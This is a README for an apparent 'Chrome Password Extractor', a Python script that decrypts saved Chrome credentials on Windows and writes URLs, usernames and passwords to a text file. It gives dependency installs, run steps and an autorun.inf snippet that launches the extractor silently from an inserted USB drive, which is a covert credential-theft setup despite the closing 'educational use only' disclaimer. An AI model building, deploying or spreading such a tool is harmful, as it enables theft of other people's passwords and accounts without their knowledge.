# Chrome Password Extractor

## Description
This project is a Python script that extracts saved passwords from Google Chrome on a Windows machine. It retrieves encrypted passwords stored in Chrome's local database, decrypts them using the system's encryption key, and saves them into a text file named `sarm.txt` in the same directory.

## Features
- Extracts saved passwords from Google Chrome.
- Decrypts passwords using the system's encryption key.
- Saves the credentials (origin URL, username, password) in `sarm.txt`.
- Automatically installs Python and required dependencies if not already installed.

## Prerequisites
- Windows operating system (tested on Windows 10 and above).
- Python 3.x installed on the system.
- Required Python libraries:
  - `pycryptodome`
  - `pypiwin32`

## Installation
1. **Clone the Repository**  
   ```sh
   git clone https://github.com/yourusername/chrome-password-extractor.git
   cd chrome-password-extractor
   ```

2. **Install Dependencies**  
   If Python is already installed, run:
   ```sh
   pip install pycryptodome pypiwin32
   ```

## Usage
1. Save the script as `chrometest.py`.
2. Run the batch script `run.bat` to execute the program automatically.
3. The extracted passwords will be saved in `sarm.txt` in the same directory.

### Running the Script Manually
```sh
python chrometest.py
```

## Automation with USB Execution
To make the script run automatically when a USB is inserted:
1. Save the batch script (`run.bat`) in the USB drive.
2. Use `autorun.inf` (this works on older Windows versions):
   ```ini
   [Autorun]
   open=run.bat
   action=Run Chrome Password Extractor
   ```
   **Note:** Due to security restrictions in Windows 10 and later, `autorun.inf` may not work. You may need to run `run.bat` manually.

## Legal Disclaimer
This script is intended for educational and ethical use only. Unauthorized access to stored passwords is illegal and unethical. Use this tool only on systems where you have explicit permission.
